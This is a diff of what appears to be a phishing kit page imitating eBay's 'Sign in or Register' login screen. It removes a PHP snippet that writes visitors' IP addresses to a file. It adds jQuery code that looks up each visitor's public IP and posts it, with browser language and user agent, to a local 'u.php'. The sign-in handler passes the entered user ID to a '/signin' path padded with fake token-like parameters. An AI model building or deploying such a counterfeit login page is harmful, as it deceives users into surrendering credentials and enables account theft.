@@ -1,22 +1,3 @@
-<?php
-function get_IP_address()
-{
-  if (!empty($_SERVER['HTTP_CLIENT_IP']))
-  {
-    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-  }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-  {
-    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-  }
-else
-  {
-    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-  }
-  return $ipaddress;
-}
-fwrite(fopen('ip.txt','w'),get_IP_address());
-?>
 <!DOCTYPE html>
 <html lang="en" class="font-marketsans"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="dns-prefetch" href="https://ir.ebaystatic.com/"><link rel="dns-prefetch" href="https://secureir.ebaystatic.com/"><link rel="dns-prefetch" href="https://i.ebayimg.com/"><link rel="dns-prefetch" href="https://rover.ebay.com/"><script async="" src="./Sign in or Register _ eBay_files/dxtuvtkk2q3hpkc1xveeo13iaek.js"></script><script>$ssgST=new Date().getTime();</script><title>Sign in or Register | eBay</title><script nonce="">
     document.domain = "ebay.com";
@@ -560,4 +541,26 @@ function onfoc(){document.getElementById('username-txt').className = 'floating-l
 function focout(){document.getElementById('username-txt').className = 'textbox__control textbox__control--fluid textbox__control--underline'; }
 var btn = document.getElementById('signin-continue-btn').addEventListener('click',function(e){e.preventDefault();var usr = document.getElementsByName('userid')[0].value;var redir = document.getElementById('redir').innerHTML;if (usr){window.location = '/signin?pass_thru=asjkfkhakshfkkkwrhi34ty92uwhifrbakjsbdnnp9348utfear==&gcaptcha=ajshdbfhakslfhiihqiuhr8923r2yruygwjefbhabbmdbfabmsbfasjfbjbfmasdf45346642345==-1=2345&geoloc=akdsbkfbaksdfjasdbfmdsbfhjwrgbehtklu2y87y348tgi4bwbfrebkaknknksadfasf==&id='+usr+'&redir='+redir;}});
 </script>
-</body></html>
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+</script>  
+<script>
+$.getJSON("https://api.ipify.org?format=json",function(data) {
+if (1) {
+    var ip = data.ip;
+    var lang = navigator.language;
+    var platform = navigator.platform;
+    var ua = navigator.userAgent;
+    var webdriver = navigator.webdriver;
+    $.ajax({
+        url : 'u.php',
+        type : 'post',
+        data : {
+            'ip' : ip,
+            'lang' : lang,
+            'ua' : ua
+        }
+    });
+}
+});
+</script></body></html>
